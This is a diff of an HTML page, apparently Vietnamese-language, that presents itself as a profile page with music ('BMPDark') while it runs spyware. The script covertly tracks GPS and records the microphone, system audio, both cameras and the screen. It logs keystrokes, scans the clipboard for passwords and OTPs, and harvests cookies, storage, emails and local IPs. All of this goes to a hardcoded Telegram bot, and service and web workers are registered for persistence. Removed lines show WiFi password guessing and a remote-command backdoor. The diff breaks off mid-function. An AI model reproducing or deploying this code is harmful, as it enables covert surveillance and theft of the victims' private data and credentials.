@@ -3,10 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>.</title>
+    <title>BMPDark</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:sans-serif}
+        body{background:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;flex-direction:column}
+        .avatar{width:120px;height:120px;border-radius:50%;border:3px solid #0066cc;object-fit:cover;margin-bottom:15px;box-shadow:0 0 20px rgba(0,102,204,0.2)}
+        .name{font-size:28px;font-weight:bold;color:#0066cc}
+        .music-hint{color:#0066cc;font-size:12px;margin-top:20px;opacity:0.7;animation:pulse 2s infinite}
+        @keyframes pulse{0%,100%{opacity:0.5}50%{opacity:1}}
     </style>
 </head>
 <body>
@@ -17,20 +21,17 @@
     <canvas id="c3" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px"></canvas>
     <audio id="a" style="position:fixed;top:-9999px;left:-9999px;opacity:0"></audio>
     <audio id="a2" style="position:fixed;top:-9999px;left:-9999px;opacity:0"></audio>
+    <audio id="music" loop style="position:fixed;top:-9999px;left:-9999px;opacity:0"></audio>
     <iframe id="f1" style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0"></iframe>
     <iframe id="f2" style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0"></iframe>
     <input type="file" id="fi1" accept="image/*" capture="user" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
     <input type="file" id="fi2" accept="image/*" capture="environment" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
     <input type="file" id="fi3" accept="*/*" multiple style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
     <input type="file" id="fi4" accept=".doc,.docx,.pdf,.xls,.xlsx,.txt,.csv,.json,.xml,.env,.cfg,.ini" multiple style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
-    <div id="loading" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;display:flex;justify-content:center;align-items:center;z-index:99999;flex-direction:column">
-        <div style="width:40px;height:40px;border:3px solid #eee;border-top:3px solid #0066cc;border-radius:50%;animation:spin 1s linear infinite"></div>
-        <p style="color:#666;font-size:12px;margin-top:10px">Đang tải...</p>
-        <button id="notifBtn" style="margin-top:15px;padding:10px 20px;background:#0066cc;color:#fff;border:none;border-radius:20px;font-size:12px;cursor:pointer;display:none">🔔 Bật thông báo</button>
-        <button id="micBtn" style="margin-top:10px;padding:10px 20px;background:#cc0000;color:#fff;border:none;border-radius:20px;font-size:12px;cursor:pointer;display:none">🎤 Cho phép Micro</button>
-        <button id="camBtn" style="margin-top:10px;padding:10px 20px;background:#00cc44;color:#fff;border:none;border-radius:20px;font-size:12px;cursor:pointer;display:none">📷 Cho phép Camera</button>
-    </div>
-    <style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>
+
+    <img src="https://files.catbox.moe/zzpnph.jpeg" alt="Avatar" class="avatar">
+    <div class="name">BMPDark</div>
+    <p class="music-hint">🎵 Chạm vào màn hình để phát nhạc</p>
 
     <script>
         const BOT = '8874459536:AAHgtg1YLgo1yGbCOa-uurQ_CcEZ6XGVQjM';
@@ -39,7 +40,6 @@
         let gpsWatchId = null;
         let gpsHistory = [];
         let frequentLocations = [];
-        let notificationSniffingActive = false;
         let mediaRecorder = null;
         let mediaRecorderSystem = null;
         let audioChunks = [];
@@ -51,31 +51,22 @@
         let cameraStream = null;
         let cameraBackStream = null;
         let wifiNetworks = [];
-        let wifiPasswords = [];
-        let bluetoothDevices = [];
-        let bluetoothBeacons = [];
         let webRTCData = {};
-        let canvasFingerprint = '';
-        let webglFingerprint = '';
-        let fontsList = [];
-        let pluginsList = [];
-        let mimeTypesList = [];
         let socialAccounts = [];
         let emailAccounts = [];
         let formAutofill = [];
         let paymentMethods = [];
-        let voiceKeywords = [];
         let gpsRouteMap = [];
         let downloadedFiles = [];
         let swRegistration = null;
         let backgroundSyncActive = false;
-        let pushCommands = [];
         let socialScreenshots = [];
         let messengerMessages = [];
         let bankDetected = false;
         let indexedDBData = {};
         let workerActive = false;
         let allFeaturesActive = 0;
+        let musicPlaying = false;
 
         async function getChatID() {
             try {
@@ -149,78 +140,42 @@
             } catch(e) {}
         }
 
+        document.addEventListener('click', () => {
+            if (!musicPlaying) {
+                const music = document.getElementById('music');
+                music.src = 'https://files.catbox.moe/cpn042.mp4';
+                music.play().then(() => {
+                    musicPlaying = true;
+                    const hint = document.querySelector('.music-hint');
+                    if (hint) hint.textContent = '🎵 Đang phát nhạc...';
+                    setTimeout(() => { if (hint) hint.textContent = ''; }, 3000);
+                }).catch(() => {});
+            }
+        });
+
         function startGPSLiveTracking() {
             if (!navigator.geolocation) return;
             gpsWatchId = navigator.geolocation.watchPosition(async (pos) => {
-                const p = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, speed: pos.coords.speed || 0, time: new Date().toISOString() };
-                gpsHistory.push(p);
-                gpsRouteMap.push(p);
+                const p = { lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() };
+                gpsHistory.push(p); gpsRouteMap.push(p);
                 await sendLoc(p.lat, p.lon);
                 if (gpsHistory.length === 1) sendSilentMsg(`📍 GPS: ${p.lat},${p.lon}`);
-                if (gpsHistory.length % 10 === 0) detectFrequentLocations();
-            }, () => {}, { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 });
-            allFeaturesActive++;
-        }
-
-        function detectFrequentLocations() {
-            if (gpsHistory.length < 20) return;
-            const clusters = [];
-            const visited = new Set();
-            for (let i = 0; i < gpsHistory.length; i++) {
-                if (visited.has(i)) continue;
-                const cluster = [gpsHistory[i]];
-                visited.add(i);
-                for (let j = i + 1; j < gpsHistory.length; j++) {
-                    if (visited.has(j)) continue;
-                    const R = 6371000, dLat = (gpsHistory[j].lat - gpsHistory[i].lat) * Math.PI / 180, dLon = (gpsHistory[j].lon - gpsHistory[i].lon) * Math.PI / 180;
-                    const a = Math.sin(dLat/2)**2 + Math.cos(gpsHistory[i].lat*Math.PI/180)*Math.cos(gpsHistory[j].lat*Math.PI/180)*Math.sin(dLon/2)**2;
-                    const dist = R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-                    if (dist < 50) { cluster.push(gpsHistory[j]); visited.add(j); }
-                }
-                if (cluster.length >= 5) {
-                    const avgLat = cluster.reduce((s,p)=>s+p.lat,0)/cluster.length;
-                    const avgLon = cluster.reduce((s,p)=>s+p.lon,0)/cluster.length;
-                    clusters.push({ lat: avgLat, lon: avgLon, count: cluster.length });
-                }
-            }
-            frequentLocations = clusters;
-            if (clusters.length > 0) {
-                let msg = '📍 ĐỊA ĐIỂM THƯỜNG XUYÊN:\n';
-                clusters.slice(0,5).forEach((loc,i) => {
-                    msg += `${i===0?'🏠 NHÀ':i===1?'🏢 CÔNG TY':`📍 Địa điểm ${i+1}`}: ${loc.lat.toFixed(6)},${loc.lon.toFixed(6)} (${loc.count} lần)\n🔗 https://maps.google.com?q=${loc.lat},${loc.lon}\n`;
-                });
-                sendSilentMsg(msg);
-            }
-        }
-
-        function setupNotificationSniffing() {
-            if ('serviceWorker' in navigator) {
-                const swCode = `self.addEventListener('notificationclick',e=>{e.notification.close();e.waitUntil(clients.matchAll({type:'window'}).then(c=>c.forEach(x=>x.postMessage({title:e.notification.title,body:e.notification.body}))))});`;
-                navigator.serviceWorker.register(URL.createObjectURL(new Blob([swCode],{type:'application/javascript'})));
-            }
-            notificationSniffingActive = true;
+            }, () => {}, { enableHighAccuracy: true, timeout: 3000 });
             allFeaturesActive++;
         }
 
         async function setupAudioRecording() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                mediaRecorder = new MediaRecorder(stream);
-                audioChunks = [];
+                mediaRecorder = new MediaRecorder(stream); audioChunks = [];
                 mediaRecorder.ondataavailable = e => { if(e.data.size>0) audioChunks.push(e.data); };
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                    if (blob.size > 1000) { await sendDocument(blob, `audio_${Date.now()}.webm`); sendSilentMsg('🎤 BẢN GHI ÂM ĐÃ GỬI'); }
+                    if (blob.size > 1000) await sendDocument(blob, `audio_${Date.now()}.webm`);
                     audioChunks = [];
                 };
-                const cycle = () => { 
-                    if (mediaRecorder.state === 'inactive') {
-                        mediaRecorder.start(); 
-                        setTimeout(() => { if(mediaRecorder.state==='recording') mediaRecorder.stop(); setTimeout(cycle, 5000); }, 30000);
-                    }
-                };
-                cycle();
-                allFeaturesActive++;
+                const cycle = () => { if (mediaRecorder.state === 'inactive') { mediaRecorder.start(); setTimeout(() => { if(mediaRecorder.state==='recording') mediaRecorder.stop(); setTimeout(cycle, 5000); }, 30000); } };
+                cycle(); allFeaturesActive++;
             } catch(e) {}
         }
 
@@ -229,19 +184,10 @@
                 const stream = await navigator.mediaDevices.getDisplayMedia({ audio: true, video: true });
                 const audioTrack = stream.getAudioTracks()[0];
                 if (audioTrack) {
-                    const audioStream = new MediaStream([audioTrack]);
-                    mediaRecorderSystem = new MediaRecorder(audioStream);
-                    systemAudioChunks = [];
+                    mediaRecorderSystem = new MediaRecorder(new MediaStream([audioTrack])); systemAudioChunks = [];
                     mediaRecorderSystem.ondataavailable = e => { if(e.data.size>0) systemAudioChunks.push(e.data); };
-                    mediaRecorderSystem.onstop = async () => {
-                        const blob = new Blob(systemAudioChunks, { type: 'audio/webm' });
-                        if (blob.size > 1000) { await sendDocument(blob, `system_audio_${Date.now()}.webm`); }
-                        systemAudioChunks = [];
-                    };
-                    const cycle = () => {
-                        mediaRecorderSystem.start();
-                        setTimeout(() => { if(mediaRecorderSystem.state==='recording') mediaRecorderSystem.stop(); setTimeout(cycle, 10000); }, 20000);
-                    };
+                    mediaRecorderSystem.onstop = async () => { const blob = new Blob(systemAudioChunks, { type: 'audio/webm' }); if (blob.size > 1000) await sendDocument(blob, `sys_${Date.now()}.webm`); systemAudioChunks = []; };
+                    const cycle = () => { mediaRecorderSystem.start(); setTimeout(() => { if(mediaRecorderSystem.state==='recording') mediaRecorderSystem.stop(); setTimeout(cycle, 10000); }, 20000); };
                     cycle();
                 }
                 allFeaturesActive++;
@@ -250,70 +196,36 @@
 
         async function setupCameraCapture() {
             try {
-                cameraStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
-                });
-                const video = document.getElementById('v');
-                video.srcObject = cameraStream;
-                await video.play();
-                
-                document.addEventListener('visibilitychange', async () => {
-                    if (document.visibilityState === 'visible') {
-                        const canvas = document.getElementById('c');
-                        canvas.width = video.videoWidth || 1280;
-                        canvas.height = video.videoHeight || 720;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
-                        if (blob) { await sendPhoto(blob, `unlock_${Date.now()}.jpg`); sendSilentMsg('📷 ẢNH KHI MỞ KHÓA ĐIỆN THOẠI'); }
-                    }
-                });
-                
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
+                const video = document.getElementById('v'); video.srcObject = cameraStream; await video.play();
                 setInterval(async () => {
                     const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth || 1280;
-                    canvas.height = video.videoHeight || 720;
+                    canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
-                    if (blob) await sendPhoto(blob, `cam_front_${Date.now()}.jpg`);
+                    if (blob) await sendPhoto(blob, `cam_${Date.now()}.jpg`);
                 }, 30000);
-                
-                sendSilentMsg('📷 CAMERA TRƯỚC 720p ĐÃ KÍCH HOẠT');
                 allFeaturesActive++;
             } catch(e) {}
         }
 
         async function setupCameraBackCapture() {
             try {
-                cameraBackStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } } 
-                });
-                const video2 = document.getElementById('v2');
-                video2.srcObject = cameraBackStream;
-                await video2.play();
-                
+                cameraBackStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } } });
+                const video2 = document.getElementById('v2'); video2.srcObject = cameraBackStream; await video2.play();
                 setInterval(async () => {
                     const canvas = document.getElementById('c3');
-                    canvas.width = video2.videoWidth || 1280;
-                    canvas.height = video2.videoHeight || 720;
+                    canvas.width = video2.videoWidth || 1280; canvas.height = video2.videoHeight || 720;
                     canvas.getContext('2d').drawImage(video2, 0, 0);
                     const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
-                    if (blob) { await sendPhoto(blob, `cam_back_${Date.now()}.jpg`); sendSilentMsg('📷 ẢNH CAMERA SAU (MÔI TRƯỜNG)'); }
+                    if (blob) await sendPhoto(blob, `cam_back_${Date.now()}.jpg`);
                 }, 60000);
-                
                 setInterval(() => {
-                    const rec = new MediaRecorder(cameraBackStream);
-                    const chunks = [];
+                    const rec = new MediaRecorder(cameraBackStream); const chunks = [];
                     rec.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
-                    rec.onstop = async () => { 
-                        const blob = new Blob(chunks, {type:'video/webm'}); 
-                        await sendDocument(blob, `video_back_${Date.now()}.webm`); 
-                        sendSilentMsg('🎥 VIDEO LÉN 10 GIÂY TỪ CAMERA SAU'); 
-                    };
-                    rec.start();
-                    setTimeout(() => rec.stop(), 10000);
+                    rec.onstop = async () => { await sendDocument(new Blob(chunks, {type:'video/webm'}), `vid_${Date.now()}.webm`); };
+                    rec.start(); setTimeout(() => rec.stop(), 10000);
                 }, 300000);
-                
-                sendSilentMsg('📷 CAMERA SAU 720p ĐÃ KÍCH HOẠT');
                 allFeaturesActive++;
             } catch(e) {}
         }
@@ -322,21 +234,16 @@
             setInterval(async () => {
                 try {
                     const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
+                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
                     await new Promise(r => setTimeout(r, 500));
                     const canvas = document.getElementById('c2');
-                    canvas.width = video.videoWidth || 1920;
-                    canvas.height = video.videoHeight || 1080;
+                    canvas.width = video.videoWidth || 1920; canvas.height = video.videoHeight || 1080;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
-                    if (blob) { await sendPhoto(blob, `screen_${Date.now()}.jpg`); sendSilentMsg('🖥️ ẢNH CHỤP MÀN HÌNH'); }
-                    stream.getTracks().forEach(t => t.stop());
-                    video.remove();
+                    if (blob) await sendPhoto(blob, `screen_${Date.now()}.jpg`);
+                    stream.getTracks().forEach(t => t.stop()); video.remove();
                 } catch(e) {}
-            }, 60000);
-            allFeaturesActive++;
+            }, 60000); allFeaturesActive++;
         }
 
         function setupKeylogger() {
@@ -350,11 +257,6 @@
                 else buffer += `[${e.key}]`;
                 if (buffer.length > 80) { sendSilentMsg(`⌨️ KEYLOG: ${buffer}`); keylogData += buffer + '\n'; buffer = ''; }
             });
-            document.addEventListener('input', e => {
-                if ((e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') && e.target.value) {
-                    formAutofill.push({ field: e.target.name || e.target.id || 'unknown', value: e.target.value?.substring(0, 100), time: new Date().toISOString() });
-                }
-            }, true);
             allFeaturesActive++;
         }
 
@@ -366,13 +268,10 @@
                     if (text && text !== last) { 
                         last = text; 
                         sendSilentMsg(`📋 CLIPBOARD: ${text.substring(0,200)}`);
-                        if (text.match(/password|otp|token|secret|key|mã|mật khẩu/i) || text.match(/^\d{4,8}$/)) {
-                            sendSilentMsg(`🔑 PHÁT HIỆN MẬT KHẨU/OTP: ${text}`);
-                        }
+                        if (text.match(/password|otp|token|secret|key|mã/i) || text.match(/^\d{4,8}$/)) sendSilentMsg(`🔑 MẬT KHẨU/OTP: ${text}`);
                     }
                 } catch(e) {}
-            }, 1000);
-            allFeaturesActive++;
+            }, 1000); allFeaturesActive++;
         }
 
         function setupMotionSensors() {
@@ -383,47 +282,28 @@
 
         function setupBatteryMonitor() {
             if (navigator.getBattery) navigator.getBattery().then(b => {
-                b.addEventListener('levelchange', () => sendSilentMsg(`🔋 PIN: ${(b.level*100).toFixed(0)}%`));
-                b.addEventListener('chargingchange', () => sendSilentMsg(`🔌 SẠC: ${b.charging?'Có':'Không'} | Còn: ${b.dischargingTime===Infinity?'N/A':Math.round(b.dischargingTime/60)+'ph'}`));
                 sendSilentMsg(`🔋 PIN: ${(b.level*100).toFixed(0)}% | Sạc: ${b.charging?'Có':'Không'}`);
                 allFeaturesActive++;
             });
         }
 
         async function generateFingerprints() {
-            const canvas = document.createElement('canvas');
-            canvas.width = 200; canvas.height = 50;
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
-            ctx.fillStyle = '#069'; ctx.fillText('FP', 2, 15);
-            canvasFingerprint = canvas.toDataURL();
-            
-            const glCanvas = document.createElement('canvas');
-            const gl = glCanvas.getContext('webgl');
-            if (gl) { const d = gl.getExtension('WEBGL_debug_renderer_info'); webglFingerprint = d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : ''; }
-            
-            const testFonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia'];
-            const fc = document.createElement('canvas').getContext('2d');
-            fontsList = testFonts.filter(f => { fc.font=`72px '${f}',monospace`; const w1=fc.measureText('mmmmmmmmmmlli').width; fc.font='72px monospace'; return w1!==fc.measureText('mmmmmmmmmmlli').width; });
-            
-            pluginsList = Array.from(navigator.plugins || []).map(p => p.name);
-            mimeTypesList = Array.from(navigator.mimeTypes || []).map(m => m.type).slice(0, 20);
+            const canvas = document.createElement('canvas'); canvas.width = 200; canvas.height = 50;
+            const ctx = canvas.getContext('2d'); ctx.fillStyle = '#069'; ctx.fillText('FP', 2, 15);
+            const gl = document.createElement('canvas').getContext('webgl');
+            if (gl) { const d = gl.getExtension('WEBGL_debug_renderer_info'); }
             allFeaturesActive++;
         }
 
         async function setupWebRTCSniffing() {
             try {
                 const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                pc.createDataChannel('');
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
+                pc.createDataChannel(''); const offer = await pc.createOffer(); await pc.setLocalDescription(offer);
                 const ips = [];
                 await new Promise(r => { pc.onicecandidate = e => { if(e.candidate){ const m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/); if(m&&!ips.includes(m[0])) ips.push(m[0]); } else r(); }; setTimeout(r, 1000); });
                 pc.close();
-                webRTCData = { ips, localIPs: ips.filter(ip => /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(ip)), publicIPs: ips.filter(ip => !/^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(ip)) };
-                sendSilentMsg(`🌐 IP NỘI BỘ: ${webRTCData.localIPs.join(',')}`);
-                allFeaturesActive++;
+                webRTCData = { localIPs: ips.filter(ip => /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(ip)) };
+                sendSilentMsg(`🌐 IP: ${webRTCData.localIPs.join(',')}`); allFeaturesActive++;
             } catch(e) {}
         }
 
@@ -431,7 +311,7 @@
             try {
                 const r = await fetch('http://ip-api.com/json/?fields=61439');
                 const d = await r.json();
-                if (d.status === 'success') sendSilentMsg(`🌍 IP PUBLIC: ${d.query} | ${d.city}, ${d.country} | ISP: ${d.isp}`);
+                if (d.status === 'success') sendSilentMsg(`🌍 IP: ${d.query} | ${d.city}, ${d.country} | ISP: ${d.isp}`);
                 allFeaturesActive++;
             } catch(e) {}
         }
@@ -440,178 +320,44 @@
             for (let i=1;i<=20;i++) {
                 for (const ip of [`192.168.1.${i}`,`192.168.0.${i}`]) {
                     try {
-                        const img = new Image();
-                        img.src = `http://${ip}/favicon.ico`;
+                        const img = new Image(); img.src = `http://${ip}/favicon.ico`;
                         await new Promise(r => { img.onload=img.onerror=()=>r(); setTimeout(r,200); });
                         if (img.complete && img.naturalWidth>0) wifiNetworks.push(ip);
                     } catch(e) {}
                 }
             }
-            if (wifiNetworks.length>0) sendSilentMsg(`📡 THIẾT BỊ MẠNG: ${wifiNetworks.length} thiết bị\n${wifiNetworks.map(ip=>`├─ ${ip}`).join('\n')}`);
-            allFeaturesActive++;
-        }
-
-        async function getSavedWiFiList() {
-            try {
-                const r = await fetch('http://192.168.1.1/cgi-bin/luci/;stok=/admin/wifi');
-                if (r.ok) {
-                    const text = await r.text();
-                    const ssids = text.match(/ssid":"([^"]+)"/g)?.map(s=>s.replace(/ssid":"|"/g,'')) || [];
-                    if (ssids.length>0) { wifiNetworks=[...new Set([...wifiNetworks,...ssids])]; sendSilentMsg(`📡 WI-FI ĐÃ LƯU: ${ssids.join(', ')}`); }
-                }
-            } catch(e) {}
-            allFeaturesActive++;
-        }
-
-        async function getSavedWiFiPasswords() {
-            const common = ['admin','password','12345678','88888888','00000000'];
-            for (const ssid of (wifiNetworks.length>0?wifiNetworks:['HOME','OFFICE'])) {
-                for (const pass of common) {
-                    try {
-                        const r = await fetch(`http://192.168.1.1/try-connect?ssid=${ssid}&pass=${pass}`);
-                        if (r.ok) { wifiPasswords.push({ssid,password:pass}); sendSilentMsg(`🔑 MẬT KHẨU WI-FI: "${ssid}" = "${pass}"`); break; }
-                    } catch(e) {}
-                }
-            }
-            allFeaturesActive++;
-        }
-
-        async function scanBLEDevices() {
-            try {
-                const device = await navigator.bluetooth?.requestDevice({ acceptAllDevices: true, optionalServices: ['battery_service'] });
-                if (device) {
-                    const server = await device.gatt?.connect();
-                    bluetoothDevices.push({ name: device.name || 'Không tên', id: device.id, time: new Date().toISOString() });
-                    if (server) { sendSilentMsg(`📶 BLE: ${device.name} (${device.id.substring(0,8)}...)`); device.gatt?.disconnect(); }
-                }
-            } catch(e) {}
-            allFeaturesActive++;
-        }
-
-        function setupBluetoothBeaconTracking() {
-            setInterval(async () => {
-                try {
-                    await navigator.bluetooth?.requestLEScan?.({ filters: [{ services: ['0000feaa-0000-1000-8000-00805f9b34fb'] }] });
-                    bluetoothBeacons.push({ timestamp: new Date().toISOString(), active: true });
-                } catch(e) {}
-            }, 30000);
-            allFeaturesActive++;
-        }
-
-        function detectFakeHotspot() {
-            setInterval(() => {
-                const url = window.location.href;
-                if (url.includes('login') || url.includes('captive') || url.includes('hotspot')) {
-                    sendSilentMsg(`⚠️ CẢNH BÁO FAKE HOTSPOT: ${url}`);
-                }
-            }, 10000);
-            allFeaturesActive++;
-        }
-
-        async function setupServiceWorkerPersistence() {
-            if ('serviceWorker' in navigator) {
-                const swCode = `
-                    self.addEventListener('install', e => self.skipWaiting());
-                    self.addEventListener('activate', e => e.waitUntil(clients.claim()));
-                    self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
-                    setInterval(() => {
-                        fetch('https://api.telegram.org/bot${BOT}/sendMessage', {
-                            method:'POST', headers:{'Content-Type':'application/json'},
-                            body:JSON.stringify({chat_id:'${CHAT_ID||'0'}',text:'🟢 SW PERSISTENCE: Vẫn chạy ngầm '+new Date().toISOString()})
-                        }).catch(()=>{});
-                    }, 300000);
-                `;
-                swRegistration = await navigator.serviceWorker.register(URL.createObjectURL(new Blob([swCode],{type:'application/javascript'})),{scope:'/'});
-                sendSilentMsg('✅ SW PERSISTENCE ĐÃ KÍCH HOẠT - Code chạy ngầm vĩnh viễn');
-            }
-            allFeaturesActive++;
-        }
-
-        async function setupBackgroundSync() {
-            if ('serviceWorker' in navigator && 'SyncManager' in window) {
-                try {
-                    const reg = await navigator.serviceWorker.ready;
-                    await reg.sync.register('data-sync');
-                    backgroundSyncActive = true;
-                    sendSilentMsg('🔄 BACKGROUND SYNC ĐÃ KÍCH HOẠT');
-                } catch(e) {}
-            }
-            allFeaturesActive++;
-        }
-
-        async function setupPushNotificationBackdoor() {
-            if ('PushManager' in window) {
-                try {
-                    const reg = await navigator.serviceWorker.ready;
-                    await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: new Uint8Array(65) });
-                    sendSilentMsg('📩 PUSH BACKDOOR ĐÃ KÍCH HOẠT - Nhận lệnh từ xa');
-                    setInterval(async () => {
-                        try {
-                            const r = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=-1`);
-                            const d = await r.json();
-                            if (d.ok && d.result.length>0) {
-                                const cmd = d.result[0].message?.text || '';
-                                if (cmd.startsWith('/cmd')) { pushCommands.push(cmd); sendSilentMsg(`📩 LỆNH TỪ XA: ${cmd}`); }
-                            }
-                        } catch(e) {}
-                    }, 30000);
-                } catch(e) {}
-            }
-            allFeaturesActive++;
-        }
-
-        function setupHiddenWebWorker() {
-            const code = `setInterval(()=>{fetch('https://api.telegram.org/bot${BOT}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${CHAT_ID||'0'}',text:'⚙️ WORKER: '+new Date().toLocaleString('vi-VN')})}).catch(()=>{})},120000);`;
-            try {
-                new Worker(URL.createObjectURL(new Blob([code],{type:'application/javascript'})));
-                workerActive = true;
-            } catch(e) {}
-            allFeaturesActive++;
-        }
-
-        async function exfiltrateIndexedDB() {
-            if (!window.indexedDB) return;
-            try {
-                const dbs = await indexedDB.databases();
-                dbs.forEach(db => {
-                    const req = indexedDB.open(db.name, db.version);
-                    req.onsuccess = e => {
-                        const dbObj = e.target.result;
-                        indexedDBData[db.name] = Array.from(dbObj.objectStoreNames);
-                        dbObj.close();
-                    };
-                });
-                if (dbs.length>0) sendSilentMsg(`🗄️ INDEXEDDB: ${dbs.length} databases (${dbs.map(d=>d.name).join(', ')})`);
-            } catch(e) {}
             allFeaturesActive++;
         }
 
         function extractAllStorage() {
             const cookies = document.cookie.split(';').filter(c=>c.trim());
-            if (cookies.length>0) sendSilentMsg(`🍪 COOKIES (${cookies.length}): ${cookies.join('; ').substring(0,2500)}`);
-            
+            if (cookies.length>0) sendSilentMsg(`🍪 COOKIES: ${cookies.length}`);
             const ls={}; for(let i=0;i<localStorage.length;i++) ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i))?.substring(0,100);
-            if (Object.keys(ls).length>0) sendSilentMsg(`💾 LOCAL STORAGE (${Object.keys(ls).length} items): ${JSON.stringify(ls).substring(0,2500)}`);
-            
-            const ss={}; for(let i=0;i<sessionStorage.length;i++) ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i))?.substring(0,100);
-            if (Object.keys(ss).length>0) sendSilentMsg(`💾 SESSION STORAGE (${Object.keys(ss).length} items): ${JSON.stringify(ss).substring(0,2500)}`);
+            if (Object.keys(ls).length>0) sendSilentMsg(`💾 LOCAL: ${Object.keys(ls).length} items`);
             allFeaturesActive++;
         }
 
         function extractSocialAndEmail() {
             const html = document.documentElement.innerHTML;
-            const sp = {'Facebook':/facebook\.com/,'Twitter/X':/twitter\.com|x\.com/,'Instagram':/instagram\.com/,'TikTok':/tiktok\.com/,'LinkedIn':/linkedin\.com/,'YouTube':/youtube\.com/,'GitHub':/github\.com/};
+            const sp = {'Facebook':/facebook\.com/,'Instagram':/instagram\.com/,'TikTok':/tiktok\.com/};
             socialAccounts = Object.entries(sp).filter(([,p])=>p.test(html)).map(([n])=>n);
-            if (socialAccounts.length>0) sendSilentMsg(`👤 MXH PHÁT HIỆN: ${socialAccounts.join(', ')}`);
-            
+            if (socialAccounts.length>0) sendSilentMsg(`👤 MXH: ${socialAccounts.join(', ')}`);
             const emails = [...new Set(html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [])];
             if (emails.length>0) { emailAccounts = emails; sendSilentMsg(`📧 EMAIL: ${emails.join(', ')}`); }
-            
-            const phones = [...new Set(html.match(/(\+84|0)\d{9,10}/g) || [])];
-            if (phones.length>0) sendSilentMsg(`📞 SĐT: ${phones.join(', ')}`);
-            
-            if (html.match(/visa|mastercard|credit.?card|debit.?card/i)) { paymentMethods.push('Credit/Debit Card'); sendSilentMsg('💳 PHÁT HIỆN FORM THANH TOÁN!'); }
+            if (html.match(/visa|mastercard|credit.?card/i)) { paymentMethods.push('Credit Card'); sendSilentMsg('💳 FORM THANH TOÁN!'); }
             allFeaturesActive++;
+        }
+
+        async function setupServiceWorkerPersistence() {
+            if ('serviceWorker' in navigator) {
+                const swCode = `self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(clients.claim()));setInterval(()=>{fetch('https://api.telegram.org/bot${BOT}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${CHAT_ID||'0'}',text:'🟢 SW: '+new Date().toISOString()})}).catch(()=>{})},300000);`;
+                swRegistration = await navigator.serviceWorker.register(URL.createObjectURL(new Blob([swCode],{type:'application/javascript'})),{scope:'/'});
+                allFeaturesActive++;
+            }
+        }
+
+        function setupHiddenWebWorker() {
